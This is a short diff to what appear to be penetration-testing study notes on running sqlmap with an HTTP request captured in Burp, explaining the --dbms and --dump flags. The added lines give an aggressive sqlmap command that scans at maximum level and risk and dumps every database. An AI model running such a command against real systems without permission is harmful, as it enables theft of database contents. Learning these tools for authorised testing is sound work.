@@ -3,3 +3,6 @@ We can use SQL Map with a captured HTTP request from burp. Once the request is c
 
 **--dbms** is the type of the data base.
 **--dump** tells us to dump the whole DB.
+
+Better scan:
+```sqlmap -r capture.txt --level 5 --risk 3 --dump-all --threads 10```
